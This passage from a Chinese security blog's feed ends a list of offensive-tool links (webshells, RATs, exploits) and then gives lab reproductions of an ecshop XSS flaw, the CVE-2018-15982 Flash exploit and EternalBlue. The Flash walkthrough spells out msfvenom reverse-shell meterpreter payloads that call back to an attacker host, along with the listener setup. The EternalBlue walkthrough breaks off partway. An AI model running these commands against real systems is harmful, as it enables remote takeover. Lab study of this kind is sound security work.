href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>web向命令注入检测工具commix<br><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>一个项目中有七种不同的DLL注入技术<br><a href="https://github.com/dylan903/injectAllTheThings" target="_blank" rel="noopener">injectAllTheThings</a> </p><h1 id="0x10-webshell"><a href="#0x10-webshell" class="headerlink" title="0x10 webshell"></a>0x10 webshell</h1><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><hr><p>This is a webshell open source project<br><a href="https://github.com/dylan903/webshell" target="_blank" rel="noopener">webshell</a></p><p>Image Payload Creating/Injecting tools<br><a href="https://github.com/chinarulezzz/pixload" target="_blank" rel="noopener">https://github.com/chinarulezzz/pixload</a></p><h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><hr><p>AntSword is a cross-platform website management toolkit.<br><a href="https://github.com/AntSwordProject/AntSword-Loader" target="_blank" rel="noopener">https://github.com/AntSwordProject/AntSword-Loader</a><br><a href="https://github.com/AntSwordProject" target="_blank" rel="noopener">AntSwordProject</a></p><p>免杀webshell无限生成工具蚁剑版<br><a href="https://github.com/yzddmr6/as_webshell_venom" target="_blank" rel="noopener">https://github.com/yzddmr6/as_webshell_venom</a></p><p>免杀webshell无限生成工具(利用随机异或无限免杀D盾)<br><a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener">https://github.com/yzddmr6/webshell-venom</a></p><p>Behinder<br><a href="https://github.com/rebeyond/Behinder" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder</a></p><p>基于Cknife的基础进行小幅度修改<br><a href="https://github.com/dylan903/CknifeModifyVersion" target="_blank" rel="noopener">CknifeModifyVersion</a></p><p>新版中国菜刀<br><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>Web版中国菜刀<br><a href="https://github.com/imjdl/WCnife" target="_blank" rel="noopener">https://github.com/imjdl/WCnife</a></p><p>Webshell-Sniper：使用Python编写的基于终端的Webshell管理工具<br><a href="https://github.com/WangYihang/Webshell-Sniper" target="_blank" rel="noopener">https://github.com/WangYihang/Webshell-Sniper</a></p><p>Platypus: A modern multiple reverse shell sessions manager written in go<br><a href="https://github.com/WangYihang/Platypus" target="_blank" rel="noopener">https://github.com/WangYihang/Platypus</a></p><h1 id="0x11-XSS"><a href="#0x11-XSS" class="headerlink" title="0x11 XSS"></a>0x11 XSS</h1><hr><p>XSS Payloads：跨站点脚本xss payloads生成器。<br><a href="https://github.com/nettitude/xss_payloads" target="_blank" rel="noopener">https://github.com/nettitude/xss_payloads</a></p><p>ezXSS：一个xss平台<br><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noopener">https://github.com/ssl/ezXSS</a></p><p>BlueLotus_XSSReceiver，XSS平台 CTF工具 Web安全工具<br><a href="https://github.com/dylan903/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/dylan903/BlueLotus_XSSReceiver</a></p><p>ImXSS：Java版开源XSS漏洞测试平台<br><a href="https://gitee.com/coodyer/imxss" target="_blank" rel="noopener">https://gitee.com/coodyer/imxss</a></p><p>XSSCon：一个简洁高效的XSS扫描工具<br><a href="https://github.com/menkrep1337/XSSCon" target="_blank" rel="noopener">https://github.com/menkrep1337/XSSCon</a></p><p>B-XSSRF，用于检测和跟踪Blind XSS，XXE和SSRF的工具包<br><a href="https://github.com/SpiderMate/B-XSSRF" target="_blank" rel="noopener">https://github.com/SpiderMate/B-XSSRF</a></p><p>xssizer：自动化XSS漏洞发现与测试工具。<br><a href="https://github.com/noLogicXD/xssizer" target="_blank" rel="noopener">https://github.com/noLogicXD/xssizer</a></p><p>xss多功能扫描器<br><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>一款强大的XSS扫描器<br><a href="https://github.com/hahwul/XSpear" target="_blank" rel="noopener">https://github.com/hahwul/XSpear</a></p><p>XSStrike<br><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p><p>XSS与CSRF工具<br><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>浏览器攻击框架beef<br><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>JShell：一个使用XSS获取JavaScript shell的脚本<br><a href="https://github.com/s0md3v/JShell" target="_blank" rel="noopener">https://github.com/s0md3v/JShell</a></p><h1 id="0x12-域渗透"><a href="#0x12-域渗透" class="headerlink" title="0x12 域渗透"></a>0x12 域渗透</h1><h2 id="渗透教程"><a href="#渗透教程" class="headerlink" title="渗透教程"></a>渗透教程</h2><hr><p>2018年初整理的一些内网渗透TIPS<br><a href="https://github.com/dylan903/Intranet_Penetration_Tips" target="_blank" rel="noopener">Intranet_Penetration_Tips</a> </p><p>内网渗透命令大全<br><a href="https://www.yuag.org/内网渗透命令大全.html" target="_blank" rel="noopener">https://www.yuag.org/内网渗透命令大全.html</a></p><p>域渗透-域内信息收集<br><a href="https://uknowsec.cn/posts/notes/域渗透-域内信息收集.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/域渗透-域内信息收集.html</a></p><p>Darth Sidious - DarthSidious<br><a href="https://hunter2.gitbook.io/darthsidious/" target="_blank" rel="noopener">https://hunter2.gitbook.io/darthsidious/</a></p><p>从零开始内网渗透学习<br><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h2 id="Windows工具"><a href="#Windows工具" class="headerlink" title="Windows工具"></a>Windows工具</h2><hr><p>Ophcrack：基于彩虹表的Windows密码破解器<br><a href="http://ophcrack.sourceforge.net/" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/</a></p><p>LaZagne：用于检索存储在本地计算机上的帐户密码的开源程序。<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><p>mimikatz<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><h1 id="0x13-提权维权"><a href="#0x13-提权维权" class="headerlink" title="0x13 提权维权"></a>0x13 提权维权</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><hr><p>CVE-2015-2426 EXP (windows内核提权)<br><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>Common Windows Misconfiguration: Services<br><a href="https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html" target="_blank" rel="noopener">windows配置错误导致权限提升</a></p><p>Evil-WinRM：用于渗透测试的终极Windows远程管理shell<br><a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener">https://github.com/Hackplayers/evil-winrm</a></p><h2 id="backdoor"><a href="#backdoor" class="headerlink" title="backdoor"></a>backdoor</h2><hr><p>phpsploit一款隐蔽的后门交互shell工具<br><a href="https://github.com/nil0x42/phpsploit" target="_blank" rel="noopener">https://github.com/nil0x42/phpsploit</a></p><p>ATT&amp;CK之后门持久化<br><a href="https://attack.mitre.org/" target="_blank" rel="noopener">ATT&amp;CK</a><br><a href="https://www.freebuf.com/articles/system/210910.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/210910.html</a></p><h1 id="0x14-漏洞利用"><a href="#0x14-漏洞利用" class="headerlink" title="0x14 漏洞利用"></a>0x14 漏洞利用</h1><h2 id="漏洞整理"><a href="#漏洞整理" class="headerlink" title="漏洞整理"></a>漏洞整理</h2><hr><p>关于ThinkPHP框架的历史漏洞分析集合<br><a href="https://github.com/Mochazz/ThinkPHP-Vuln" target="_blank" rel="noopener">ThinkPHP-Vuln</a> </p><p>ExploitDB官方git版本:<br><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：<br><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><hr><h3 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a>windows</h3><p>PowerSploit - A PowerShell Post-Exploitation Framework<br><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>linux漏洞扫描<br><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p><p>CentOS-Control-Web-Panel-CVE(CentOS Web面板0.9.8.836 - 0.9.8.847)<br><a href="https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE" target="_blank" rel="noopener">https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE</a></p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JAVA反序列化POC生成工具<br><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP<br><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>tomcat自动后门部署<br><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><h4 id="vbulletin"><a href="#vbulletin" class="headerlink" title="vbulletin"></a>vbulletin</h4><p>Identify vulnerable (RCE) vBulletin 5.0.0 - 5.5.4 instances using Shodan (CVE-2019-16759)<br><a href="https://github.com/Frint0/mass-pwn-vbulletin" target="_blank" rel="noopener">https://github.com/Frint0/mass-pwn-vbulletin</a></p><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><p>WPScan is a free, for non-commercial use, black box WordPress Vulnerability Scanner written for security professionals and blog maintainers to test the security of their WordPress websites.<br><a href="https://github.com/dylan903/wpscan" target="_blank" rel="noopener">https://github.com/dylan903/wpscan</a></p><p>WPSeku：一款用于WordPress漏洞扫描的安全程序。<br><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a></p><h4 id="discuz"><a href="#discuz" class="headerlink" title="discuz"></a>discuz</h4><p>DISCUZ漏洞扫描器：<br><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p><h4 id="phpsutdy"><a href="#phpsutdy" class="headerlink" title="phpsutdy"></a>phpsutdy</h4><p>phpstudy后门漏洞利用工具-本工具支持单url检测，cmdshell，get web shell（写入一句话木马），批量检测。<br><a href="https://github.com/theLSA/phpstudy-backdoor-rce" target="_blank" rel="noopener">https://github.com/theLSA/phpstudy-backdoor-rce</a></p><h3 id="SSL"><a href="#SSL" class="headerlink" title="SSL"></a>SSL</h3><p>自动扫描到ssl漏洞（心血、ccs注射、sslv3贵宾犬、怪胎、logjam攻击、sslv2溺水等）。<br><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a></p><h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><p>git泄露利用EXP<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>CVE-2016-2107<br><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC<br><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>Jenkins CommonCollections EXP<br><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):<br><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具<br><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本<br><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h1 id="0x15-代码审计"><a href="#0x15-代码审计" class="headerlink" title="0x15 代码审计"></a>0x15 代码审计</h1><hr><p>php代码审计工具<br><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p><p>自动化代码审计工具cobra<br><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p><p>cobra: Source Code Security Audit (源代码安全审计)<br><a href="https://github.com/WhaleShark-Team/cobra" target="_blank" rel="noopener">https://github.com/WhaleShark-Team/cobra</a></p><h1 id="0x16-其他工具"><a href="#0x16-其他工具" class="headerlink" title="0x16 其他工具"></a>0x16 其他工具</h1><h2 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h2><hr><p>Proxy：golang实现的高性能http,https,websocket,tcp,udp,socks5,ss代理服务器,支持正向代理、反向代理、透明代理、内网穿透、TCP/UDP端口映射、SSH中转、TLS加密传输、协议转换、防污染DNS代理。<br><a href="https://github.com/snail007/goproxy" target="_blank" rel="noopener">https://github.com/snail007/goproxy</a></p><p>nps：一款轻量级、功能强大的内网穿透反向代理工具。<br><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">https://github.com/cnlh/nps</a></p><p>TOR Router：该工具允许您将Tor设置为默认网关，并在Tor（透明代理）下发送所有Internet连接，以提高隐私/匿名性。<br><a href="https://github.com/Edu4rdSHL/tor-router" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/tor-router</a></p><p>mitmproxy：支持SSL的中间人HTTP代理<br><a href="https://github.com/mitmproxy/mitmproxy/" target="_blank" rel="noopener">https://github.com/mitmproxy/mitmproxy/</a></p><p>setup-ipsec-vpn: Scripts to build your own IPsec VPN server,<br>with IPsec/L2TP and Cisco IPsec on Ubuntu, Debian and CentOS<br><a href="https://github.com/hwdsl2/setup-ipsec-vpn" target="_blank" rel="noopener">https://github.com/hwdsl2/setup-ipsec-vpn</a></p><p>SwitchyOmega<br><a href="https://github.com/FelisCatus/SwitchyOmega" target="_blank" rel="noopener">https://github.com/FelisCatus/SwitchyOmega</a></p><p>gfwlist<br><a href="https://github.com/gfwlist/gfwlist" target="_blank" rel="noopener">https://github.com/gfwlist/gfwlist</a></p><p>Venom: Venom - A Multi-hop Proxy for Penetration Testers<br><a href="https://github.com/Dliv3/Venom" target="_blank" rel="noopener">https://github.com/Dliv3/Venom</a></p><p>Scripts to build your own IPsec VPN server, with IPsec/L2TP and Cisco IPsec on Ubuntu, Debian and CentOS<br><a href="https://github.com/dylan903/setup-ipsec-vpn" target="_blank" rel="noopener">setup-ipsec-vpn</a></p><p>Web代理<br><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>ShadowsockR<br><a href="https://github.com/sklun/ShadowsockR" target="_blank" rel="noopener">https://github.com/sklun/ShadowsockR</a></p><p>shadowsocks-heroku: 一键部署 Free Shadowsocks-Heroku<br><a href="https://github.com/makedefenxiang/shadowsocks-heroku" target="_blank" rel="noopener">https://github.com/makedefenxiang/shadowsocks-heroku</a></p><h2 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h2><hr><p>quasar: Quasar Framework - Build high-performance VueJS user interfaces in record time<br><a href="https://github.com/quasarframework/quasar/tree/3aa266595b07054910978d01160c0c3c6834ffd1" target="_blank" rel="noopener">https://github.com/quasarframework/quasar/tree/3aa266595b07054910978d01160c0c3c6834ffd1</a></p><p>SimpleRemoter: 基于gh0st的远程控制器<br><a href="https://github.com/yuanyuanxiang/SimpleRemoter" target="_blank" rel="noopener">https://github.com/yuanyuanxiang/SimpleRemoter</a></p><p>Lime-RAT: LimeRAT | Simple, yet powerful remote administration tool for Windows (RAT)<br><a href="https://github.com/NYAN-x-CAT/Lime-RAT" target="_blank" rel="noopener">https://github.com/NYAN-x-CAT/Lime-RAT</a></p><p>Stitch: Python Remote Administration Tool (RAT)<br><a href="https://github.com/nathanlopez/Stitch" target="_blank" rel="noopener">https://github.com/nathanlopez/Stitch</a></p><p>Koadic C3 COM Command &amp; Control - JScript RAT(基于Python C2服务器来实现)<br><a href="https://github.com/zerosum0x0/koadic" target="_blank" rel="noopener">https://github.com/zerosum0x0/koadic</a></p><p>P2P内网穿透，实现【公司】-【家】远程控制<br><a href="https://github.com/bobowire/Wireboy.Socket.P2PSocket" target="_blank" rel="noopener">https://github.com/bobowire/Wireboy.Socket.P2PSocket</a></p><p>An evil RAT (Remote Administration Tool) for macOS / OS X.<br><a href="https://github.com/Marten4n6/EvilOSX" target="_blank" rel="noopener">https://github.com/Marten4n6/EvilOSX</a></p><p>android屏幕共享及远程控制<br><a href="https://github.com/android-notes/androidScreenShareAndControl" target="_blank" rel="noopener">https://github.com/android-notes/androidScreenShareAndControl</a></p><h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><hr><p>Ehtools：是一个功能强大的Wi-Fi渗透工具框架<br><a href="https://github.com/entynetproject/ehtools" target="_blank" rel="noopener">https://github.com/entynetproject/ehtools</a></p><p>atear：无线黑客攻击、WiFi安全、漏洞分析仪、Pentenstration。<br><a href="https://github.com/NORMA-Inc/AtEar" target="_blank" rel="noopener">https://github.com/NORMA-Inc/AtEar</a></p><h2 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h2><hr><p>hyper：A terminal built on web technologies<br><a href="https://github.com/zeit/hyper" target="_blank" rel="noopener">https://github.com/zeit/hyper</a></p><p>yperpwn：A hyper plugin to provide a flexible GDB GUI with the help of GEF, pwndbg or peda<br><a href="https://github.com/bet4it/hyperpwn" target="_blank" rel="noopener">https://github.com/bet4it/hyperpwn</a></p><h2 id="堡垒机项目"><a href="#堡垒机项目" class="headerlink" title="堡垒机项目"></a>堡垒机项目</h2><hr><p>APubPlat：一款开源堡垒机项目，Devops自动化部署、堡垒机开源项目、Web Terminal<br><a href="https://github.com/wangweianger/APubPlat" target="_blank" rel="noopener">https://github.com/wangweianger/APubPlat</a></p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><hr><p>通过部分评估实现高级JavaScript解密反混淆工具。<br><a href="https://github.com/mindedsecurity/JStillery" target="_blank" rel="noopener">https://github.com/mindedsecurity/JStillery</a></p><p>apache日志分析器<br><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p><p>http命令行客户端<br><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器攻击框架<br><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> tools </tag>
            
            <tag> sources </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ecshop XSS 复现</title>
      <link href="/2019/08/17/ecshop-xss-fu-xian/"/>
      <url>/2019/08/17/ecshop-xss-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>使用Chrome调试XSS漏洞，需要关闭XSS过滤器,才能成功弹窗</p><p><code>&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot; --args --disable-xss-auditor</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008215335.png" alt></p><h1 id="0x02-复现"><a href="#0x02-复现" class="headerlink" title="0x02 复现"></a>0x02 复现</h1><p>本地搭建ECShop v2.7.2 ，php版本5.3及以下，否则会报各种各样的错</p><p>访问<code>http://192.168.1.6/article_cat.php?id=1</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220513.png" alt></p><p>搜索框输入<code>1\\\&quot;&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code>提交，成功弹窗</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220738.png" alt></p><p>burpsuite抓包POST提交，记得添加</p><p><code>Content-Type: application/x-www-form-urlencoded</code></p><p><code>keywords=1234567\\\&quot;&gt;&lt;script&gt;alert(123456)&lt;/script&gt;&amp;id=1&amp;cur_url=http://127.0.0.1/article_cat.php?id=1</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191008220925.png" alt></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>这里总结一下常用POST请求类型</p><ul><li>raw 原始类型，可以上传任意格式的文本，比如 text、json、xml、html</li></ul><pre><code>该编码类型的表单，必须通过AJAX技术JSON: application/jsonXML: text/xml纯文本: text/plainhtml: text/html</code></pre><ul><li>application/x-www-form-urlencoded，会将表单内的数据转换拼接成 key-value 对（非 ASCII 码进行编码）<br>URLencoded: application/x-www-form-urlencoded</li></ul><pre><code>HTML中&lt;form&gt;标签的enctype属性用来指定表单编码格式，默认为application/x-www-form-urlencoded请求头:（这里只给出了Content-Type字段）：POST http://www.example.com HTTP/1.1Content-Type: application/x-www-form-urlencoded</code></pre><ul><li>multipart/form-data，将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件</li></ul><pre><code>请求头：POST http://www.example.com HTTP/1.1Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryrGKCBY7qhFd3TrwA</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/shiyuqing1207/article/details/46430017" target="_blank" rel="noopener">关闭谷歌chrome xss过滤器</a><br><a href="https://blog.csdn.net/jesse_cool/article/details/86608816" target="_blank" rel="noopener">http 请求头的几种Content-type</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> XSS </tag>
            
            <tag> ecshop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-15982任意代码执行漏洞复现</title>
      <link href="/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/08/08/cve-2018-15982-ren-yi-dai-ma-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年11月29日，360高级威胁应对团队在全球范围内第一时间发现一起针对俄罗斯的APT攻击行动，通过一份俄文内容的医院员工问卷文档，携带最新的Flash 0day漏洞和具有自毁功能的专属木马程序，该漏洞（CVE-2018-15982）允许攻击者恶意制作的Flash对象在受害者的计算机上执行代码，从而获取对系统命令行的访问权限。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><ul><li>AdobeFlash Player &lt;= 31.0.0.153</li><li>AdobeFlash Player Installer&lt;= 31.0.0.108<br>（不包括AdobeFlash Player 32.0.0.101、AdobeFlash Player Installer 31.0.0.122）</li></ul><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：Linux kali (192.168.159.136)<br>靶机：windows7 x64（192.168.159.133）<br>Flash版本: Adobe Flash Player ActiveX_29.0.0.155<br>链接: <a href="https://pan.baidu.com/s/1S5hbsREkhWv_b1zyn-rQUg" target="_blank" rel="noopener">Adobe Flash Player ActiveX_29.0.0.155</a><br>提取码: c8sf<br>(注意：断网安装)</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p><strong>kali:</strong></p><p><strong>git 漏洞POC</strong><br><code>git clone https://github.com/Ridter/CVE-2018-15982_EXP</code></p><p>msfvenom生成两个payload程序（32位和64位）<br><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 86.bin</code></p><p><code>msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=ZALE LPORT=4444 LHOST=192.168.159.136 -f raw &gt; 64.bin</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144511.png" alt></p><p><strong>生成POC</strong><br>将生成的两个<code>.bin</code>文件copy进下载的POC文件夹，<br>并cd进去，执行.py文件生成POC</p><pre><code>cp *.bin CVE-2018-15982_EXP/cd CVE-2018-15982_EXP/python CVE_2018_15982.py -i 86.bin -I 64.bin</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808144751.png" alt></p><p>开启apache服务，并将生成的两个文件copy进html目录</p><pre><code>systemctl start apache2.servicecp index.html /var/www/htmlcp exploit.swf /var/www/html</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145202.png" alt></p><p><strong>设置msf监听</strong></p><p>启动msf</p><p><code>msfconsole</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145436.png" alt></p><pre><code>use exploit/multi/handler set payload windows/meterpreter/reverse_tcp_rc4set lport 4444set lhost 192.168.159.136set RC4PASSWORD zaleexploit</code></pre><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145507.png" alt></p><p><strong>靶机:</strong></p><p>使用靶机访问<code>192.168.159.136/index.html</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150229.png" alt></p><p>成功反弹session<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808145952.png" alt></p><p><code>sessions -l</code><br>显示会话列表</p><p><code>sessions id</code><br>选择指定id会话<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190808150006.png" alt></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.freebuf.com/column/197760.html" target="_blank" rel="noopener">CVE-2018-15982任意代码执行漏洞复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> CVE-2018-15982 </tag>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝漏洞(ms17-010)复现</title>
      <link href="/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/"/>
      <url>/2019/08/07/yong-heng-zhi-lan-lou-dong-ms17-010-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>永恒之蓝漏洞（Eternalblue）是方程式组织在其漏洞利用框架中一个针对SMB服务进行攻击的漏洞，该漏洞导致攻击者在目标系统上可以执行任意代码。Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，无需用户进行任何操作，就可以中招。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>目前已知受影响的Windows 版本包括但不限于：<br>WindowsNT<br>Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8<br>Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 SP0</p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali 2.0<br>靶机：Windows 7 X64 （192.168.159.133）</p><h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><p>两种方法</p><h3 id="一、使用nmap扫描"><a href="#一、使用nmap扫描" class="headerlink" title="一、使用nmap扫描"></a>一、使用nmap扫描</h3><p><code>nmap -r 192.168.159.0/24C</code></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807171738.png" alt></p><h3 id="二、使用msf扫描模块"><a href="#二、使用msf扫描模块" class="headerlink" title="二、使用msf扫描模块"></a>二、使用msf扫描模块</h3><p> kali 执行 <code>msfconsole</code> 进入MSF框架</p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172414.png" alt></p><p>搜索ms17_010<br><code>search ms17_010</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190807172807.png" alt></p><p>使用ms17-010扫描模块，对靶机Win7进行扫描<br>使用模块<br><code>use auxiliary/scanner/smb/smb_ms17_010</code></p><p>设置目标ip<br><code>set RHOSTS 